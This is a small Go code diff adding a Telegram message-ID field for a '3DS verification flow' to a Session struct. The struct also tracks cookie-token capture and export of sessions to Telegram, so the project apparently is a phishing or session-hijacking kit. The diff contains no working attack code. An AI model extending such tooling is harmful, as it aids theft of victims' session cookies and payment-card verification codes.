@@ -34,6 +34,7 @@ type Session struct {
 	TelegramExported     bool // Track if session was already exported to Telegram
 	IsCaptchaVerified    bool // Track if CAPTCHA was verified for this session
 	GatherDelayPending   bool // True while cookie gather delay goroutine is running
+	ThreeDSMsgID         int  // Telegram message ID for 3DS verification flow
 }
 
 func NewSession(name string) (*Session, error) {
@@ -64,6 +65,7 @@ func NewSession(name string) (*Session, error) {
 		TelegramExported:     false,
 		IsCaptchaVerified:    false,
 		GatherDelayPending:   false,
+		ThreeDSMsgID:         0,
 	}
 	s.CookieTokens = make(map[string]map[string]*database.CookieToken)
 
